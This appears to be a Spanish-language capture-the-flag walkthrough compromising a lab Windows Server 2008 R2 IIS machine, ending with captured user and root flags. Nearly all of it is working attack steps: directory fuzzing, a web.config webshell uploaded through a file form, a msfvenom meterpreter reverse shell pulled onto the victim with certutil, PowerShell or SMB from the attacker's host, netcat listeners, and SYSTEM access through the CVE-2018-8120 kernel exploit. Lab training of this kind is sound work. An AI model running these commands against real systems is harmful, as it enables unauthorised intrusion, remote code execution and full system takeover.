PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
47001/tcp open  winrm

-Nos vamos al puerto 80 y encontramos un servidor IIS

-Hacemos fuzzing con las extensiones .asp y .aspx:
	-gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.1.128 -x asp,aspx --add-slash -t 100

-Encontramos la ruta --> /zoc.aspx/ que nos permite subir archivos. En el código fuente vemos que los archivos subidos se almacenan en /subiditodetono.

-Todas las extensiones que probamos están capadas (asp,aspx,pl...)

-Buscamos **'hacktrix file upload'** y en la sección de **'ASP'** encontramos la extensión **'.config'.** Probamos y nos deja subir archivos con extensión **.config**

-Buscamos en **PayloadAllTheThings/Upload Insecure Files/Configuration IIS/web.config**

-Nos copiamos el contenido del archivo web.config, nos creamos un archivo 'shell.config' y lo subimos al servidor IIS. Esto va a subir una webshell al servidor, la cual ejecutaremos desde /subiditosdetono
	-http://192.168.1.128/subiditosdetono/shell.config?cmd=dir
		-Funciona!!

### Como obtener acceso a la máquina mediante una webshell

1-Generamos una reverse shell .exe con msfvenom, la cual nos aportará una sesión de meterpreter
	-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.135 LPORT=4444 -f exe -o shell.exe

2-Iniciamos un servidor con python para compartir el .exe con la máquina víctima
	-python3 -m http.server 80

3-Creamos una carpeta en la máquina víctima, dónde descargaremos la reverse shell:
	-mkdir c:\temp

4-Hacemos una petición a nuestro servidor, desde la webshell, para descargar la reverse shell en la máquina víctima. 2 opciones:
	1-Con Certutil:
		-certutil -urlcache -f http://192.168.1.135/shell.exe c:\temp\shell.exe
	2-Con Powershell:
		-powershell -c "Invoke-WebRequest -Uri 'http://192.168.1.100/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"

5-Nos ponemos a la escucha. 2 opciones:
	-Con Metasploit:
		-use multi/handler
		-set lhost IP
		-set lport PORT
		-run
	-Con rlwrap:
		-rlwrap nc -lvnp 4444

6-Ejecutamos el archivo shell.exe desde la webshell y obtenemos la conexión:
	-c:\temp\shell.exe

-Nos ponemos en escucha con rlwrap y hemos obtenido la conexión:
	c:\windows\system32\inetsrv>

**Opción más fácil -->** Abrimos un servidor con 'impacket-smbserver' y ejecutamos directamente la reverse shell en la máquina víctima:
	-Iniciamos servidor: impacket-smbserver smb .
	-Desde la webshell: \\192.168.1.135\smb\shell.exe
		c:\windows\system32\inetsrv>

## Escalada de privilegios

-Ejecutamos el siguiente comando para ver la información del sistema:
	-sysinfo
		-Nombre del sistema operativo: Microsoft windows Server 2008 R2 Datacenter

-Nos vamos a la siguiente ubicación de Payloadallthethings:
	-Payloadsallthethins/methodology and resources/Windows - Privilege Escalation.md
		-Nos sale que el contenido de esta página se ha movido a la siguiente ubicación:
			[InternalAllTheThings/redteam/escalation/windows-privilege-escalation](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)

-En la parte de la derecha buscamos --> EoP - Kernel Exploitation

-Encontramos el siguiente CVE para escalar privilegios:
	[CVE-2018-8120](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120) [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2

-Nos lo descargamos y lo descargamos dentro de la máquina víctima:
	1-wget https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120
	2-python3 -m http.server 80
	3-Máquina víctima: certutil -urlcache -f http://192.168.1.135/x64.exe c:\temp\x64.exe
		(nos descargamos x64 por que la versión del sistema es de 64 bits , si fuera de 32 había que descargar la x86)

-El 'x64.exe' nos permite ejecutar cualquier comando como NT\Authority System, por lo que vamos a ejecutar la reverse shell 'shell.exe' que descargamos anteriormente para establecer una conexión con privilegios elevados (NT\Authority System)
	-Máquina víctima: x64.exe shell.exe
	-Nuestra máquina: rlwrap nc -lvnp 4444
		-c:\temp> whoami 
			NT\Authority System

user
uigsg5sdfdfbv5b6sad98vcdf

root
jbeaf7gvser79aw6vvbf78wrgv




